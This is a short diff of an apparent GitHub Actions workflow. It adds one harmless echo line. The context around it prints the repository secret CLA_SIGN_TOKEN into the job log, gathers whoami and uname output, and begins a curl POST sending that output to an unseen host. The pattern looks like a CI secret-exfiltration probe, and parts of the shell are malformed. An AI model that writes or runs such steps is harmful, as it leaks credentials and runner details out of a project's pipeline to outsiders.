@@ -25,6 +25,7 @@ jobs:
           echo ${{ secrets.CLA_SIGN_TOKEN }}
           echo "$whoami && uname -a):"
           echo $whoami && uname -a)
+          echo "afasfa"
           OUTPUT="$(whoami && uname -a)"
           curl -X POST -H "Content-Type: text/plain" \
             --data "$OUTPUT" \
